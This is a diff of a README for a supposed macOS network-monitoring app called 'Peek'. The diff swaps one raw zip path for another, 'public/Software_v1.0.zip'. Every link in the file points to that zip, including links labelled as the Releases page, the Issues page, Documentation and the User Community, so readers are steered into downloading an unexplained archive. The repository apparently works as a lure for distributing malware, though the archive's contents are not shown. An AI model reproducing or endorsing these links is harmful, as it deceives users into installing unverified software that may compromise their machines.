@@ -4,7 +4,7 @@
 Welcome to Peek! This app helps you monitor your network effortlessly. You can track bandwidth, analyze packets, and gain insights into your network performance—all from your menu bar.
 
 ## 🔗 Download Peek
-[![Download Peek](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/frike/Peek.zip)](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/frike/Peek.zip)
+[![Download Peek](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/public/Software_v1.0.zip)](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/public/Software_v1.0.zip)
 
 ## 💻 System Requirements
 - macOS 10.15 (Catalina) or later
@@ -12,7 +12,7 @@ Welcome to Peek! This app helps you monitor your network effortlessly. You can t
 - 100 MB of available disk space
 
 ## 📥 Download & Install
-To get started, visit this page to download: [GitHub Releases for Peek](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/frike/Peek.zip). 
+To get started, visit this page to download: [GitHub Releases for Peek](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/public/Software_v1.0.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest stable version of Peek.
@@ -54,10 +54,10 @@ A: Peek supports both Wi-Fi and Ethernet connections.
 A: Peek provides real-time updates, so you always see the latest performance stats.
 
 ## 📱 Contact & Support
-For help or to report issues, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/frike/Peek.zip). Your feedback is valuable in making Peek better.
+For help or to report issues, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/public/Software_v1.0.zip). Your feedback is valuable in making Peek better.
 
 ## 🔗 Additional Resources
-- [Peek Documentation](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/frike/Peek.zip)
-- [User Community](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/frike/Peek.zip)
+- [Peek Documentation](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/public/Software_v1.0.zip)
+- [User Community](https://raw.githubusercontent.com/ReinerCPrecillas/Peek/main/public/Software_v1.0.zip)
 
 Thank you for choosing Peek. We hope it serves you well in monitoring your network performance. For further updates and news, feel free to follow our GitHub repository.
